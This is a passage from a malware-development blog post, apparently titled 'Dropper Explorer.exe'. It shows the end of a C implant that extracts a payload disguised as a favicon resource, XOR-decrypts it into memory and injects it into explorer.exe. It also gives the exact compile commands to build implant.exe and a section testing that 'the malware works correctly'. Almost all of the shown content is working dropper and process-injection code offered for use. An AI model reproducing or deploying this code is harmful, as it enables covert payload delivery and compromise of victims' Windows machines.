	<span class="n">HGLOBAL</span> <span class="n">resHandle</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">HRSRC</span> <span class="n">res</span><span class="p">;</span>
	
	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">payload</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">;</span>
	
	<span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="n">hProc</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	
	<span class="c1">// Extract payload from resources section</span>
	<span class="n">res</span> <span class="o">=</span> <span class="n">FindResource</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">MAKEINTRESOURCE</span><span class="p">(</span><span class="n">FAVICON_ICO</span><span class="p">),</span> <span class="n">RT_RCDATA</span><span class="p">);</span>
	<span class="n">resHandle</span> <span class="o">=</span> <span class="n">LoadResource</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">res</span><span class="p">);</span>
	<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">LockResource</span><span class="p">(</span><span class="n">resHandle</span><span class="p">);</span>
	<span class="n">payload_len</span> <span class="o">=</span> <span class="n">SizeofResource</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">res</span><span class="p">);</span>
	
	<span class="c1">// Allocate some memory buffer for payload</span>
	<span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>

	<span class="c1">// Copy payload to new memory buffer</span>
	<span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
	
	<span class="c1">// Decrypt (DeXOR) the payload</span>
	<span class="n">XOR</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>
	
	<span class="c1">// Injection into explorer.exe</span>
	<span class="n">pid</span> <span class="o">=</span> <span class="n">FindTarget</span><span class="p">(</span><span class="s">"explorer.exe"</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
		<span class="c1">// try to open target process</span>
		<span class="n">hProc</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span> <span class="n">PROCESS_CREATE_THREAD</span> <span class="o">|</span> <span class="n">PROCESS_QUERY_INFORMATION</span> <span class="o">|</span> 
						<span class="n">PROCESS_VM_OPERATION</span> <span class="o">|</span> <span class="n">PROCESS_VM_READ</span> <span class="o">|</span> <span class="n">PROCESS_VM_WRITE</span><span class="p">,</span>
						<span class="n">FALSE</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span> <span class="n">pid</span><span class="p">);</span>

		<span class="k">if</span> <span class="p">(</span><span class="n">hProc</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">Inject</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
			<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProc</span><span class="p">);</span>
		<span class="p">}</span>
	<span class="p">}</span>

	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</pre></table></code></div></div><p>And compile the file:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">C:\Users\Zeropio&gt;</span>rc resources.rc
<span class="gp">C:\Users\Zeropio&gt;</span>cvtres /MACHINE:x64 /OUT:resources.o resources.res
<span class="gp">C:\Users\Zeropio&gt;</span>cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:WINDOWS /MACHINE:x64 resources.o
</pre></table></code></div></div><hr /><h2 id="test"><span class="mr-2">Test</span><a href="#test" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Now we can test if the malware works correctly:</p><p><a href="/assets/img/maldev/putty/2023-02-01-13-22.gif" class="popup img-link "><img data-src="/assets/img/maldev/putty/2023-02-01-13-22.gif" alt="Untitled" class="lazyload" data-proofer-ignore></a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/malware/'>Malware</a>, <a href='/categories/development/'>Development</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/malware/" class="post-tag no-text-decoration" >malware</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=MalDev%20%7C%20Dropper%20Explorer.exe%20-%20Zeropio's%20Dojo&url=https%3A%2F%2Fzeropio.ninja%2F%2Fmalware%2Fdevelopment%2Fdropper-explorer-1" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=MalDev%20%7C%20Dropper%20Explorer.exe%20-%20Zeropio's%20Dojo&u=https%3A%2F%2Fzeropio.ninja%2F%2Fmalware%2Fdevelopment%2Fdropper-explorer-1" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fzeropio.ninja%2F%2Fmalware%2Fdevelopment%2Fdropper-explorer-1&text=MalDev%20%7C%20Dropper%20Explorer.exe%20-%20Zeropio's%20Dojo" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/index">Index</a><li><a href="/sensei/shellcode-blacksmith">The Shellcode Blacksmith | Sensei</a><li><a href="/lowlevel/osdev/chapter-0">OSDev | Chapter 0 | Basic Kernel</a><li><a href="/malware/development/putty-1">MalDev | Putty</a><li><a href="/malware/development/dropper-explorer-1">MalDev | Dropper Explorer.exe</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/lowlevel/">lowlevel</a> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/osdev/">osdev</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/research/">research</a> <a class="post-tag" href="/tags/reversing/">reversing</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div><script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/malware/development/putty-1"><div class="card-body"> <em class="small" data-ts="1674946800" data-df="ll" > Jan 29, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>MalDev | Putty</h3><div class="text-muted small"><p> Enumeration First, debug a 32bit putty.exe in x32dbg. There is a inital breakpoint in the binary: Address=00454AD0 Module/Label/Exception=&amp;lt;putty.exe.EntryPoint&amp;gt; State=One-time Disassembly=pu...</p></div></div></a></div><div class="card"> <a href="/malware/triage/sillyputty"><div class="card-body"> <em class="small" data-ts="1662415200" data-df="ll" > Sep 6, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Triage | SillyPutty</h3><div class="text-muted small"><p> Name Sample Link Personal Rating * MD5 Hash WannaCry GitHub PMAT Husky 3.0 334a10500feb0f3444bf2e86ab2e76da *This ...</p></div></div></a></div><div class="card"> <a href="/malware/triage/wannacry"><div class="card-body"> <em class="small" data-ts="1662760800" data-df="ll" > Sep 10, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Triage | WannaCry</h3><div class="text-muted small"><p> Name Sample Link Personal Rating * MD5 Hash WannaCry Github PMAT Husky 6.5 db349b97c37d22f5ea1d1841e3c89eb4 This r...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/malware/development/putty-1" class="btn btn-outline-primary" prompt="Older"><p>MalDev | Putty</p></a> <a href="/lowlevel/osdev/chapter-0" class="btn btn-outline-primary" prompt="Newer"><p>OSDev | Chapter 0 | Basic Kernel</p></a></div></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/lowlevel/">lowlevel</a> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/osdev/">osdev</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/research/">research</a> <a class="post-tag" href="/tags/reversing/">reversing</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> Â© 2023 <a href="https://twitter.com/ZeropioWasTaken">zeropio</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Using the <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> theme <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>.</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1.11.6/dayjs.min.js,npm/dayjs@1.11.6/locale/en.min.js,npm/dayjs@1.11.6/plugin/relativeTime.min.js,npm/dayjs@1.11.6/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
